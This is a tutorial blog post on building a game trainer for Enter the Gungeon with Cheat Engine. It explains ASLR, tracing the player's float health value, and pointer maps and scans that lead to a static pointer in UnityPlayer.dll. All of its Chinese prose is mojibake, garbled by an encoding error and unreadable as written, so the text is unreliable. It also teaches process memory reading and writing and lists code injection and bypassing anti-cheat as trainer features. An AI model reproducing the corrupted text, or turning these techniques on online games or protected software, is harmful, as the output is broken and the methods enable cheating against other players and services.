<p>CE æœç´¢æ•°æ®éå¸¸ç®€å•ï¼Œåªéœ€è¦é™„åŠ åˆ°è¿›ç¨‹ï¼Œç„¶åæœç´¢ç¡®åˆ‡çš„æ•°å€¼ï¼Œæ¥ç€åœ¨æ¸¸æˆä¸­ä¿®æ”¹æ•°å€¼ï¼Œåå¤æœç´¢ï¼Œç›´åˆ°å‰©ä¸‹çš„åœ°å€æ¡ç›®å¾ˆå°‘ï¼ŒåŸºæœ¬å°±å®šä½åˆ°äº†æ­£ç¡®çš„æ•°æ®ã€‚</p>
<p>æ¥ç€å¯ä»¥ç›´æ¥è¿›è¡Œä¿®æ”¹æŸ¥çœ‹æ•ˆæœï¼Œå…³äº CE æŸ¥æ‰¾æ¸¸æˆæ•°æ®æœ‰å¾ˆå¤šè¯¦ç»†çš„æ•™ç¨‹ï¼Œæ¨èå…ˆå®Œæˆ CE è‡ªå¸¦çš„æ•™ç¨‹ç¨‹åºï¼Œè¿™æ ·èƒ½å¯¹å®ƒæœ‰ä¸€ä¸ªå…¨é¢çš„äº†è§£ã€‚</p>
<p>æˆ‘ä»¬å¯ä»¥åšä¸€ä¸ªå°å®éªŒï¼Œè®°å½•ä¸‹ç¬¬ä¸€æ¬¡æ‰¾åˆ°çš„æ•°æ®æ‰€åœ¨åœ°å€ï¼Œç„¶åé€€å‡ºæ¸¸æˆï¼Œé‡æ–°æ‰“å¼€æ¸¸æˆå¹¶æ‰¾åˆ°ç›¸åŒçš„æ•°æ®æ‰€åœ¨åœ°å€ï¼Œä½ ä¼šå‘ç°ä¸¤æ¬¡å¾—åˆ°çš„æ•°æ®åœ°å€æ˜¯ä¸åŒçš„ï¼ŒåŸå› æ˜¯ç°ä»£æ“ä½œç³»ç»Ÿéƒ½å­˜åœ¨ ASLRï¼Œå³åœ°å€å¸ƒå±€éšæœºåŒ–æŠ€æœ¯ï¼Œç¨‹åºæ¯æ¬¡è¿è¡Œçš„æ—¶å€™éƒ½ä¼šè¢«åŠ è½½åˆ°ä¸åŒçš„åœ°å€ç©ºé—´ï¼Œè¿™æ ·èƒ½å¤Ÿç¼“è§£ä¸€äº›æ¼æ´å¯¹äºç³»ç»Ÿçš„æŸå®³ã€‚</p>
<p>ä½†æ˜¯è¿™ç»™æˆ‘ä»¬ä¿®æ”¹æ¸¸æˆæ•°æ®å¸¦æ¥äº†ä¸€äº›å›°éš¾ï¼Œè™½ç„¶ä½¿ç”¨ CE èƒ½å¤Ÿå®šä½åˆ°æ¸¸æˆæ•°æ®ï¼Œä½†æ˜¯æ¯æ¬¡é‡æ–°å¯åŠ¨æ¸¸æˆéƒ½éœ€è¦æŒ‰ç…§ç›¸åŒçš„æ­¥éª¤é‡æ–°æ‰¾åˆ°æ•°æ®æ‰€åœ¨åœ°å€ï¼Œæœ‰æ²¡æœ‰ä»€ä¹ˆå¥½æ–¹æ³•èƒ½å¤Ÿä¸€åŠ³æ°¸é€¸å‘¢ï¼Ÿ</p>
<p>ç­”æ¡ˆå°±æ˜¯é™æ€æŒ‡é’ˆï¼Œç°ä»£æ¸¸æˆä¸€èˆ¬ä½“é‡éƒ½å¾ˆå¤§ï¼Œå†…éƒ¨é€»è¾‘ä¹Ÿéå¸¸å¤æ‚ï¼Œæ¸¸æˆå¯èƒ½è¢«åˆ†ä¸ºå‡ åä¸ªæ¨¡å—ï¼Œä¸ºäº†æ–¹ä¾¿æ¨¡å—ä¹‹é—´ç›¸äº’è®¿é—®æ•°æ®ï¼Œä¸€èˆ¬éƒ½ä¼šå­˜åœ¨å…¨å±€é™æ€æŒ‡é’ˆæŒ‡å‘æŸäº›å…³é”®æ•°æ®ï¼Œä¾‹å¦‚æ¸¸æˆä¸»è§’ã€‚</p>
<p>é™æ€æ•°æ®è™½ç„¶ä¹Ÿä¼šå—åˆ° ASLR çš„å½±å“ï¼Œä½†å®ƒæœ‰ä¸€ä¸ªå¾ˆé‡è¦çš„ç‰¹ç‚¹ï¼Œç›¸å¯¹æ¨¡å—åŸºå€åç§»å›ºå®šï¼Œç¨‹åºæ¯æ¬¡åŠ è½½ä¹‹åæˆ‘ä»¬å¯ä»¥é€šè¿‡æŠ€æœ¯æ‰‹æ®µç¡®å®šæ¯ä¸ªæ¨¡å—çš„åœ°å€ï¼Œå› æ­¤å¯ä»¥æ ¹æ®å›ºå®šçš„åç§»é‡æ‰¾åˆ°å¯¹åº”çš„é™æ€æŒ‡é’ˆã€‚</p>
<p>ä¸€èˆ¬æ¥è¯´ï¼Œæˆ‘ä»¬èƒ½å¤Ÿæ‰¾åˆ°çš„æ¸¸æˆæ•°æ®éƒ½ä¼šæœ‰ä¸€ä¸ªé™æ€æŒ‡é’ˆä¸ä¹‹å¯¹åº”ï¼Œè¿™æ˜¯é¢å‘å¯¹è±¡å¼€å‘æ¨¡å¼çš„ç‰¹æ€§ï¼Œå¼€å‘è€…é€šå¸¸ä¼šå°†æ¸¸æˆä¸­çš„è§’è‰²ã€é“å…·ç¼–å†™æˆç±»ï¼Œç±»ä¸­åŒ…å«å’Œæ­¤å¯¹è±¡æœ‰å…³çš„æ•°æ®ï¼Œä¾‹å¦‚ä¸»è§’æœ‰è¡€é‡å’ŒæŠ¤ç”²å€¼ï¼Œå¼€å‘è€…å¾ˆå¯èƒ½ä¼šå°†å®ƒä»¬å†™åœ¨åŒä¸€ä¸ªç±»ä¸­ï¼Œå› æ­¤æˆ‘ä»¬æ‰¾åˆ°è¡€é‡ï¼Œé‚£ä¹ˆå‰©ä½™æ•°æ®åŸºæœ¬å°±åˆ†å¸ƒåœ¨è¡€é‡å†…å­˜é™„è¿‘ã€‚</p>
<h2 id="ä¿®æ”¹å™¨å¼€å‘å®ä¾‹"><a href="#ä¿®æ”¹å™¨å¼€å‘å®ä¾‹" class="headerlink" title="ä¿®æ”¹å™¨å¼€å‘å®ä¾‹"></a>ä¿®æ”¹å™¨å¼€å‘å®ä¾‹</h2><p>æˆ‘ä»¬ä»¥<strong>æŒºè¿›åœ°ç‰¢</strong>è¿™æ¬¾æ¸¸æˆä¸ºä¾‹ï¼Œç®€å•æ¼”ç¤ºä¸€ä¸‹ä¿®æ”¹å™¨çš„åŸºæœ¬å¼€å‘æŠ€å·§ã€‚</p>
<p>é¦–å…ˆï¼Œæ¸¸æˆä¿®æ”¹å™¨é€šå¸¸ä½¿ç”¨ C++ æ¥å¼€å‘ï¼Œè¿™æ˜¯ç”±äº C++ å¯ä»¥åƒ C è¯­è¨€ä¸€æ ·ç›´æ¥ä½¿ç”¨ Windows æä¾›çš„ APIï¼Œä½†åœ¨ C è¯­è¨€åŸºç¡€ä¸Šåˆå¤šå‡ºäº†é¢å‘å¯¹è±¡çš„æ¦‚å¿µã€‚C# é€šå¸¸ä¹Ÿå¯ä»¥ç”¨äºä¿®æ”¹å™¨å¼€å‘ï¼Œä½†æ˜¯ C# æƒ³è¦è°ƒç”¨åº•å±‚ API éœ€è¦ä½¿ç”¨å§”æ‰˜ç­‰è¾ƒå¤æ‚çš„æŠ€æœ¯ï¼Œå¦å¤– C# ä¸­æ²¡æœ‰äº†æŒ‡é’ˆçš„æ¦‚å¿µï¼ŒæŸäº›æ“ä½œä¸Šå¯èƒ½æ²¡æœ‰ C++ çµæ´»ã€‚</p>
<p>ä¿®æ”¹å™¨éœ€è¦å®ç°çš„åŸºæœ¬åŠŸèƒ½ï¼š</p>
<ol>
<li>èƒ½å¤Ÿé™„åŠ åˆ°ç›®æ ‡è¿›ç¨‹</li>
<li>èƒ½å¤Ÿè¯»å–ç›®æ ‡è¿›ç¨‹æŒ‡å®šå†…å­˜åœ°å€çš„æ•°æ®</li>
<li>èƒ½å¤Ÿå†™å…¥ç›®æ ‡è¿›ç¨‹æŒ‡å®šå†…å­˜åœ°å€çš„æ•°æ®</li>
<li>å¦‚æœæ˜¯å†…éƒ¨ä¿®æ”¹å™¨ï¼Œéœ€è¦å°†è‡ªèº«ä»£ç æ³¨å…¥åˆ°ç›®æ ‡è¿›ç¨‹ä¸­</li>
<li>ç»•è¿‡åä½œå¼Šï¼Ÿ</li>
</ol>
<p>é€‰æ‹©äººç‰©ï¼Œè¿›å…¥åœ°ç‰¢ä¹‹åå¯ä»¥çœ‹åˆ°è§’è‰²æ‹¥æœ‰å‡ ä¸ªåŸºæœ¬å±æ€§ï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/game_trainer-2.png"
                     
                ></p>
<p>åˆ†åˆ«æ˜¯è¡€é‡ã€ç©ºå“å¼¹(æ¸¸æˆä¸­çš„ä¸€ç§ç‰¹æ®Šé“å…·)ã€é’¥åŒ™ä»¥åŠé‡‘é’±ã€‚é¦–å…ˆæŸ¥æ‰¾è¡€é‡æ‰€åœ¨çš„åœ°å€ï¼Œç®€å•æ¸¸ç©ä¹‹åå¯ä»¥å‘ç°æ¯æ¬¡å—åˆ°ä¼¤å®³ï¼Œè¡€é‡ä¼šå‡å°‘ä¸€åŠï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/game_trainer-3.png"
                     
                ></p>
<p>æˆ‘ä»¬å¯ä»¥çŒœæµ‹æ­¤æ¸¸æˆçš„è¡€é‡æœ‰ä¸¤ç§ä¿å­˜æ–¹å¼ï¼Œä¸€æ˜¯ä½¿ç”¨æ•´æ•°ï¼Œå³åˆå§‹è¡€é‡ä¸º 6ï¼Œæ¯æ¬¡å—ä¼¤å‡ä¸€ã€‚å¦å¤–è¿˜å¯ä»¥ä½¿ç”¨æµ®ç‚¹æ•°å½¢å¼ä¿å­˜ï¼Œåˆå§‹å€¼ä¸º 3.0ï¼Œæ¯æ¬¡å—ä¼¤å‡å°‘ 0.5ã€‚</p>
<p>ç»è¿‡æœç´¢ï¼Œæ¸¸æˆçš„è¡€é‡æ˜¯ float å‹ä¿å­˜çš„ï¼Œå³åˆå§‹ 3.0ã€‚</p>
<p>é‚£ä¹ˆåœ¨ CE ä¸­æŸ¥æ‰¾ç¡®åˆ‡çš„å€¼ï¼Œfloat ç±»å‹ï¼Œé‡å¤æœç´¢ï¼Œæœ€åèƒ½å¤Ÿæ‰¾åˆ°ä¸€ä¸ªåœ°å€ï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/game_trainer-4.png"
                     
                ></p>
<p>åŒå‡»æ­¤åœ°å€å¯å°†å®ƒä¿å­˜åˆ°ä¸‹æ–¹è¡¨æ ¼ä¸­ï¼ŒåŒå‡» value å¯ä»¥ä¿®æ”¹å®ƒçš„å€¼ï¼Œä¾‹å¦‚æˆ‘ä»¬ä¿®æ”¹æˆ 3 ï¼Œå›åˆ°æ¸¸æˆä¼šå‘ç°è¡€é‡å›æ»¡ã€‚å› æ­¤è¿™ä¸ªåœ°å€ä¿å­˜çš„æ•°å€¼å°±æ˜¯ä¸»è§’çš„ç”Ÿå‘½å€¼ã€‚</p>
<p>æ ¹æ®å‰é¢çš„ä»‹ç»ï¼Œè¿™ä¸ªåœ°å€å¾ˆæœ‰å¯èƒ½åªæ˜¯ä¸€ä¸ªåŠ¨æ€åœ°å€ï¼Œæ¯æ¬¡é‡æ–°å¯åŠ¨æ¸¸æˆéƒ½ä¸åŒã€‚ä½ å¯ä»¥è‡ªå·±å°è¯•é‡å¯æ¸¸æˆè¯•éªŒä¸€ä¸‹ï¼Œå®é™…ä¸Š CE ä¸­è‡ªå¸¦äº†æ£€æµ‹åœ°å€æ˜¯å¦ä¸ºåŠ¨æ€åœ°å€çš„åŠŸèƒ½ï¼Œåœ¨åœ°å€åˆ—è¡¨ä¸­æ‰€æœ‰é»‘è‰²çš„åœ°å€éƒ½æ˜¯åŠ¨æ€çš„ï¼Œè€Œé™æ€åœ°å€ä¼šä»¥ç»¿è‰²è¡¨ç¤º(æ‰€è°“é™æ€åœ°å€å°±æ˜¯ç›¸å¯¹æ¨¡å—åç§»é‡å›ºå®šçš„åœ°å€)ã€‚</p>
<p>ç°åœ¨æˆ‘ä»¬æ‰¾åˆ°äº†ç”Ÿå‘½å€¼æ‰€åœ¨çš„åŠ¨æ€åœ°å€ï¼Œé‚£ä¹ˆå¦‚ä½•æ‰èƒ½æ‰¾åˆ°å®ƒçš„é™æ€åœ°å€å‘¢ï¼Ÿ</p>
<p><strong>æœ€åŸå§‹çš„æ–¹æ³•</strong>ï¼š</p>
<p>å³é”®ç‚¹å‡»è¿™ä¸ªåœ°å€ï¼Œé€‰æ‹© find what access this address é€‰é¡¹ï¼ŒCE ä¼šè‡ªåŠ¨é™„åŠ ä¸€ä¸ªè°ƒè¯•å™¨åˆ°æ¸¸æˆä¸Šï¼Œå¹¶ä¸”åœ¨ç›®æ ‡åœ°å€æ·»åŠ ä¸€ä¸ªç¡¬ä»¶è®¿é—®æ–­ç‚¹ï¼Œä¹‹åæ‰€æœ‰è®¿é—®äº†è¿™ä¸ªæ•°æ®çš„æŒ‡ä»¤éƒ½ä¼šè¢«è®°å½•ä¸‹æ¥ã€‚</p>
<p>é™„åŠ ä¹‹åæˆ‘ä»¬åœ¨æ¸¸æˆä¸­æ•…æ„å—åˆ°ä¼¤å®³ï¼Œä¼šå‘ç°æœ‰å‡ æ¡æŒ‡ä»¤è®¿é—®äº†è¡€é‡è¿™ä¸ªåœ°å€ï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/game_trainer-5.png"
                     
                ></p>
<p>è¿™äº›æŒ‡ä»¤çš„è®¿é—®æ¬¡æ•°å„ä¸ç›¸åŒï¼Œç¬¬ä¸€æ¡æŒ‡ä»¤è®¿é—®éå¸¸é¢‘ç¹ï¼Œè€Œåé¢çš„æŒ‡ä»¤åªæœ‰åœ¨è§’è‰²å—ä¼¤ä¹‹åæ‰è¢«åŠ è½½å‡ºæ¥ã€‚</p>
<p>è€ƒè™‘åˆ°è¡€é‡åœ¨å†…å­˜ä¸­åªæ˜¯ä¸€ä¸²æ•°å­—ï¼Œåªæœ‰ç»˜åˆ¶åˆ°å±å¹•ä¸Šæ‰èƒ½ç»™ç©å®¶ç›´è§‚çš„æ„Ÿå—ã€‚æ¸¸æˆçš„ç”»é¢æ¯ç§’é’Ÿä¼šç»˜åˆ¶ä¸Šç™¾æ¬¡ï¼Œä»¥æ­¤æ¥å½¢æˆæµç•…çš„æ˜¾ç¤ºæ•ˆæœã€‚æ‰€ä»¥ä¸€å®šæœ‰æŸä¸ªå‡½æ•°è´Ÿè´£é‡ç»˜ç”»é¢ï¼Œåœ¨ç»˜åˆ¶è¿‡ç¨‹ä¸­å°±è¦è®¿é—®åˆ°ç›¸å…³æ•°æ®ã€‚</p>
<p>è€Œåé¢çš„æŒ‡ä»¤å¾ˆå¯èƒ½å°±å’Œæ¸¸æˆé€»è¾‘æœ‰å…³äº†ã€‚ä¾‹å¦‚æœ‰åˆ¤æ–­å­å¼¹å’Œè§’è‰²ç¢°æ’çš„ä»£ç ï¼Œæˆ–æ˜¯ä¸“é—¨è´Ÿè´£æ§åˆ¶è¡€é‡çš„ä»£ç ç­‰ç­‰ï¼Œå…·ä½“è¦çœ‹å¼€å‘è€…æ€ä¹ˆå®šä¹‰äº†ã€‚</p>
<p>ä¸è¿‡æ‰€æœ‰æŒ‡ä»¤éƒ½æœ‰ä¸€ä¸ªè§„å¾‹ï¼Œå®ƒä»¬è®¿é—®çš„åœ°å€éƒ½æ˜¯ [xxx + 118] è¿™ç§å½¢å¼ï¼Œå®é™…ä¸Šè¿™æ˜¯æŒ‡é’ˆè§£å¼•ç”¨çš„æ±‡ç¼–ä»£ç ï¼Œxxx å¯„å­˜å™¨ä¸­ä¿å­˜çš„æ˜¯æŸä¸ªæ¸¸æˆå¯¹è±¡çš„æŒ‡é’ˆï¼Œåœ¨æŒ‡é’ˆåç§» 0x118 ä½ç½®å¤„ä¿å­˜ç€ç©å®¶çš„è¡€é‡æ•°æ®ã€‚ç¿»è¯‘æˆä»£ç åº”è¯¥å¦‚ä¸‹</p>
<div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Player</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="comment">// xxx æ•°æ®</span></span><br><span class="line">    <span class="type">float</span> health;   <span class="comment">// åç§» 0x118 ä½ç½®</span></span><br><span class="line">    <span class="comment">// xxx æ•°æ®</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="comment">// xxxx  </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>é‚£ä¹ˆæ˜¯ä¸æ˜¯ xxx å¯„å­˜å™¨ä¸­ä¿å­˜çš„æ•°å€¼å°±æ˜¯é™æ€åœ°å€å‘¢ï¼Ÿæˆ‘ä»¬å¯ä»¥é€‰ä¸­æŸæ¡æŒ‡ä»¤æ‰¾åˆ°å¯„å­˜å™¨ä¸­çš„æ•°æ®ï¼Œåœ¨ CE ä¸­ä»¥ hex å½¢å¼æœç´¢ï¼Œèƒ½å¤Ÿæ‰¾åˆ°å¾ˆå¤šç»“æœï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/game_trainer-6.png"
                     
                ></p>
<p>è¿™äº›ç»“æœä»ç„¶æ˜¯åŠ¨æ€åœ°å€ï¼Œå®é™…ä¸Šè¿™å°±æ˜¯å¤šçº§æŒ‡é’ˆã€‚</p>
<p>é¢å‘å¯¹è±¡å¼€å‘ä¸­é€šå¸¸ä¼šç¼–å†™å„ç§ç±»ï¼Œä¾‹å¦‚æœ¬æ¸¸æˆä¸»è§’æœ‰åŸºæœ¬çš„æ•°æ®ï¼Œä¸»è§’æ‰‹é‡Œæ‹¿ç€æªï¼Œä¸åŒçš„æªæœ‰ä¸åŒçš„å±æ€§ï¼Œå¦å¤–è¿˜å¯ä»¥æ‹¾å–ä¸åŒçš„é“å…·ç­‰ï¼Œè¡¨ç¤ºç©å®¶çš„ç±»ä¸­å¾ˆå¯èƒ½åŒ…å«ç€å…¶ä»–å¯¹è±¡çš„å®ä¾‹ï¼Œç”¨ä¼ªä»£ç è¡¨ç¤ºå¦‚ä¸‹</p>
<div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Player</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    HealthController healthPtr;</span><br><span class="line">    GunController gun;</span><br><span class="line">    <span class="comment">// xxx</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>è¿™å°±å¯¼è‡´ç©å®¶å¯¹è±¡ä¸­åˆå­˜åœ¨ç€æŒ‡å‘å…¶ä»–å¯¹è±¡çš„æŒ‡é’ˆï¼Œè€Œå…¶ä»–å¯¹è±¡ä¸­åˆä¼šå­˜åœ¨æŒ‡å‘å¦å¤–ä¸€äº›æ•°æ®çš„æŒ‡é’ˆ</p>
<p>æºä»£ç ç»è¿‡ç¼–è¯‘å™¨ç¼–è¯‘ä¹‹åå°±ä¼šå‡ºç°å¾ˆå¤š [xxx + xxx] å½¢å¼çš„æŒ‡é’ˆè§£å¼•ç”¨ï¼Œé€šå¸¸å¯„å­˜å™¨ä¸­ä¿å­˜çš„æ˜¯æŸä¸ªå¯¹è±¡çš„èµ·å§‹åœ°å€ï¼ŒåŠ ä¸Šåç§»é‡å°±å¾—åˆ°äº†ç¡®åˆ‡çš„æ•°æ®ã€‚</p>
<p>æ‰€è°“æœ€åŸå§‹çš„æ–¹æ³•å°±æ˜¯ä¸€çº§ä¸€çº§çš„å‘ä¸Šå¯»æ‰¾æŒ‡é’ˆï¼Œä¾‹å¦‚æˆ‘ä»¬é€šè¿‡è¡€é‡å¾—åˆ°äº†æŸä¸ªå¯¹è±¡çš„åŸºå€ï¼Œé‚£ä¹ˆå¯ä»¥ç¡®å®šè‚¯å®šæœ‰å¦ä¸€ä¸ªå¯¹è±¡ä¿å­˜äº†è¿™ä¸ªåŸºå€æŒ‡é’ˆï¼Œæ‰€ä»¥å†æ¬¡æœç´¢è¿™ä¸ªåŸºå€ï¼Œæ‰¾åˆ°äº†ä¸€å¤§å †åœ°å€ï¼Œè¿™äº›åœ°å€å¾ˆå¯èƒ½å±äºå…¶ä»–å¯¹è±¡ï¼Œè¿˜éœ€è¦é‡å¤æ‰§è¡Œ find what access this address æ‰¾åˆ°ä»€ä¹ˆæŒ‡ä»¤è®¿é—®äº†è¿™ä¸ªåœ°å€ï¼Œä»è€Œæ‰¾åˆ°å¦å¤–ä¸€ä¸ªå¯¹è±¡çš„åŸºå€â€¦(CE æ•™ç¨‹ä¸­æœ‰å¤šçº§æŒ‡é’ˆçš„ç« èŠ‚ï¼Œå¯è‡ªè¡Œäº†è§£)</p>
<p>ä½“ç§¯æ¯”è¾ƒå°çš„æ¸¸æˆæœ€å¤šå¯èƒ½ä¼šå­˜åœ¨ 6ã€7 çº§æŒ‡é’ˆï¼Œä½“ç§¯å¾ˆå¤§çš„æ¸¸æˆå¯èƒ½å­˜åœ¨åå‡ å±‚æŒ‡é’ˆï¼Œè¿™ç§æ‰‹åŠ¨å¯»æ‰¾æ–¹å¼æ•ˆç‡å¤ªä½ï¼Œè€Œä¸”æ‰¾åˆ°çš„åœ°å€å¾ˆå¯èƒ½æ²¡åŠæ³•ç¨³å®šä½¿ç”¨ã€‚</p>
<p><strong>èªæ˜çš„æ–¹æ³•</strong>ï¼š</p>
<p>å¯»æ‰¾å¤šçº§æŒ‡é’ˆçš„åŸç†åŸºæœ¬å¯æ¦‚æ‹¬ä¸ºï¼š</p>
<ol>
<li>æ‰¾åˆ°ç›®æ ‡æ•°æ®æ‰€åœ¨çš„å¯¹è±¡åŸºå€(å¯¹è±¡1)</li>
<li>æ‰¾åˆ°å¯¹è±¡1æ‰€åœ¨çš„å¯¹è±¡çš„åŸºå€(å¯¹è±¡2)</li>
<li>å¦‚æ­¤å¾ªç¯ç›´åˆ°æ‰¾åˆ°ä¸€ä¸ªé™æ€æŒ‡é’ˆæŒ‡å‘çš„å¯¹è±¡åœ°å€</li>
</ol>
<p>å®é™…ä¸Šè¿™ä¸€è¿‡ç¨‹å°±æ˜¯æŸ¥æ‰¾åŸºå€å’Œåç§»é‡çš„è¿‡ç¨‹ï¼Œç”±äºæ¯æ¬¡æœç´¢å¯¹è±¡çš„åŸºå€éƒ½ä¼šå‡ºç°å¾ˆå¤šåœ°å€ï¼Œé‚£ä¹ˆå¯ä»¥é€šè¿‡è®°å½•è¿™äº›åœ°å€å’Œåç§»é‡è®©ç¨‹åºè‡ªåŠ¨å¯»æ‰¾åˆ°æ‰€æœ‰å¯èƒ½çš„æŒ‡é’ˆè·¯çº¿ã€‚</p>
<p>ä¾‹å¦‚ä¸Šé¢æˆ‘ä»¬æ‰¾åˆ°äº† 17 æ¡åœ°å€ï¼Œå°†ä»–ä»¬æ·»åŠ åˆ°ä¸€ä¸ªæ•°ç»„ä¸­ï¼Œå¹¶è®°å½•ä¸‹å¯¹åº”çš„åç§»é‡ï¼Œæ¯æ¬¡ä»æ•°ç»„ä¸­é€‰å‡ºä¸€ä¸ªåœ°å€ï¼Œæ‰¾åˆ°è¿™ä¸ªåœ°å€æ‰€åœ¨å¯¹è±¡çš„åŸºå€ï¼Œå†æ¬¡æœç´¢ï¼Œå¹¶å°†ç»“æœæ·»åŠ åˆ°æ•°ç»„ä¸­ï¼Œå¦‚æ­¤å¾ªç¯ç›´åˆ°æ‰¾åˆ°ä¸€ä¸ªé™æ€åœ°å€ã€‚è¿™æ ·å°±èƒ½è‡ªåŠ¨æ‰¾åˆ°æ‰€æœ‰å’Œç›®æ ‡æ•°æ®ç›¸å…³çš„é™æ€æŒ‡é’ˆï¼Œè€Œä¸”åç§»é‡ä¹Ÿè¢«è‡ªåŠ¨è®°å½•ä¸‹æ¥ã€‚</p>
<p>è¿™ç§æŸ¥æ‰¾æ–¹å¼åœ¨ CE ä¸­è¢«ç§°ä¸ºæŒ‡é’ˆè¡¨ã€‚å³é”®è¡€é‡åœ°å€å³å¯çœ‹åˆ° pointer map é€‰é¡¹ï¼Œæˆ‘ä»¬å¯ä»¥å¯¹è¡€é‡è¿™ä¸ªåœ°å€ç”Ÿæˆä¸€ä¸ªæŒ‡é’ˆè¡¨ï¼Œç„¶åé€‰æ‹©æŒ‡é’ˆæ‰«æé€‰é¡¹ï¼Œåœ¨å¼¹å‡ºçš„çª—å£ä¸­é€‰æ‹©ä½¿ç”¨æŒ‡é’ˆè¡¨ï¼Œå¹¶è®¾ç½®ç»“å°¾åç§»é‡å¿…é¡»æ˜¯ 0x118:</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/game_trainer-7.png"
                     
                ></p>
<p>è¿™æ · CE å°±ä¼šè‡ªåŠ¨åˆ—å‡ºæ‰€æœ‰ç¬¦åˆæ¡ä»¶çš„æŒ‡é’ˆï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/game_trainer-8.png"
                     
                ></p>
<p>ç»“æœä¸€å…±æœ‰ 60 ä¸‡å¤šä¸ªï¼Œæƒ³è±¡ä¸€ä¸‹å¦‚æœæ‰‹åŠ¨å¯»æ‰¾éœ€è¦å¤šå°‘ç²¾åŠ›ã€‚</p>
<p>ä¸è¿‡è‡ªåŠ¨æŸ¥æ‰¾å‡ºæ¥çš„æŒ‡é’ˆä¹Ÿä¸æ˜¯å…¨éƒ¨æœ‰æ•ˆçš„ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç¬¬ä¸€åˆ— base address ä¸­æ¶‰åŠåˆ°äº†å¾ˆå¤šä¸åŒçš„æ¨¡å—ï¼Œè¿™ 60 ä¸‡ä¸ªæŒ‡é’ˆæœ‰å¾ˆå¤§ä¸€éƒ¨åˆ†åªæ˜¯å‡‘å·§æŒ‡å‘äº†ç›®æ ‡åœ°å€ï¼Œä¸ºäº†ç¼©å‡æŒ‡é’ˆæ•°é‡ï¼Œæˆ‘ä»¬å¯ä»¥é‡æ–°å¯åŠ¨æ¸¸æˆï¼Œå†æ¬¡æ‰¾åˆ°ç”Ÿå‘½å€¼æ‰€åœ¨åœ°å€ï¼Œç„¶åé‡å¤ä¸Šé¢çš„æ“ä½œå†æ¬¡ç”Ÿæˆä¸€å¼ æŒ‡é’ˆè¡¨ï¼Œç»“åˆä¸¤å¼ è¡¨æœç´¢æŒ‡é’ˆï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/game_trainer-9.png"
                     
                ></p>
<p>è¿™æ · CE ä¼šæ¯”å¯¹ä¸¤å¼ è¡¨çš„æŒ‡é’ˆç»“æœï¼Œä»è€Œå»é™¤æ‰€æœ‰ä¸ç¬¦åˆè§„åˆ™çš„æŒ‡é’ˆã€‚</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/game_trainer-10.png"
                     
                ></p>
<p>è¿™æ¬¡æœç´¢åˆ° 317 ä¸ªæŒ‡é’ˆï¼Œç»†å¿ƒè§‚å¯Ÿä¸€ä¸‹å‘ç°è¿˜æœ‰å¾ˆå¤šæŒ‡é’ˆæœ€åçš„æ•°æ®åœ¨å˜åŠ¨ï¼Œè¿™äº›æŒ‡é’ˆä¹Ÿæ˜¯æ— æ•ˆçš„ã€‚æˆ‘ä»¬å¯ä»¥é€‰æ‹©ç»§ç»­é‡å¯æ¸¸æˆï¼Œè¿›ä¸€æ­¥ç¼©å‡æŒ‡é’ˆæ•°é‡ï¼Œæˆ–è€…ç›´æ¥åœ¨æ¸¸æˆä¸­å—ä¼¤ï¼Œç„¶ååœ¨é€‰é¡¹å¡ä¸­é€‰æ‹© pointer scanner -&gt; rescan memory é€‰é¡¹ï¼Œé€‰æ‹© value to find å¡«å†™å½“å‰ç”Ÿå‘½å€¼ï¼Œå³å¯ç›´æ¥è¿›è¡Œä¸€æ¬¡æŒ‡é’ˆæœç´¢ã€‚</p>
<p>æ— è®ºé‡‡ç”¨å“ªç§æ–¹æ³•ï¼Œæœ€ç»ˆåº”è¯¥ä¼šå‰©ä¸‹å‡ ä¸ªæŒ‡é’ˆï¼Œæ­¤æ—¶æˆ‘ä»¬å°±å¯ä»¥é€ä¸ªæµ‹è¯•äº†ã€‚</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/game_trainer-11.png"
                     
                ></p>
<p>ä¾‹å¦‚æˆ‘æ‰¾åˆ°äº†ä¸€ä¸ªåœ°å€ UnityPlayer.dll + 0x144EBB8ï¼Œç»è¿‡æµ‹è¯•å‘ç°è¿™ä¸ªåœ°å€ç¡®å®æ˜¯é™æ€çš„ï¼Œå¹¶ä¸”æ¯æ¬¡é‡æ–°å¯åŠ¨æ¸¸æˆéƒ½ä¸ä¼šå˜åŠ¨ã€‚ç°åœ¨å¯ä»¥åœ¨ CE ä¸­é€‰æ‹© Add Address Manually ï¼Œæ·»åŠ ä¸€ä¸ªæŒ‡é’ˆ</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/game_trainer-12.png"
                     
                ></p>
<p>æ­¤æ—¶å°±æ·»åŠ äº†ä¸€ä¸ªæŒ‡é’ˆåˆ° CE ä¸­ï¼Œé‡æ–°å¯åŠ¨æ¸¸æˆä¹Ÿä¸ä¼šå‘ç”Ÿæ”¹å˜ã€‚</p>
<p>æˆ‘ä»¬å¾—åˆ°äº†é™æ€æŒ‡é’ˆï¼Œç°åœ¨å¯ä»¥ç€æ‰‹å®ç°ä¿®æ”¹å™¨ä¸»ä½“äº†ã€‚</p>
